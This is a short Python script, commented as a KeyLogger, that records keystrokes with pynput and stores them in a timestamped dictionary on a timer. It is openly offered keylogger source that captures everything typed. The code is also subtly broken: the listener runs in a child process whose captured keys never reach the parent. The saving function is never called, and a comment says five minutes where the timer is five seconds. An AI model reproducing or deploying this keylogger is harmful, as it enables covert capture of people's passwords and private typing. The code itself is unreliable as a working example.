from pynput import keyboard
import threading
from time_stamp import *
from msgbox import *
from multiprocessing import Process

input_keys = []
all_keys = []
memory = {}
flag = True

def my_listener():
    def on_press(key):
        try:
            global input_keys
            add_to_list(key.char)
            print(input_keys)
        except:
            input_keys.append(str(key))
        return False

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

###     save text from last 5 minutes in memory     ###
def save_to_memory():
    global input_keys, memory
    if input_keys:
        text = "".join(input_keys)
        memory[time_stamp()] = text
        input_keys = []
    ### timer   ###
    threading.Timer(5, save_to_memory).start()


###     print memory        ###
def print_memory():
    try:
        if memory:
            text = 'memory' + '\n' * 3
            for i in memory.values():
                text += i + '\n'
            print_text(str(text))
        else:
            print_text('no text!')
    except:
        print_text('Error')

def add_to_list(key):
    input_keys.append(key)

def run_listener_forever():
    while True:
        p = Process(target=my_listener)
        p.start()
        p.join()
        p.terminate()

if __name__ == '__main__':
###     run KeyLogger       ###
    run_listener_forever()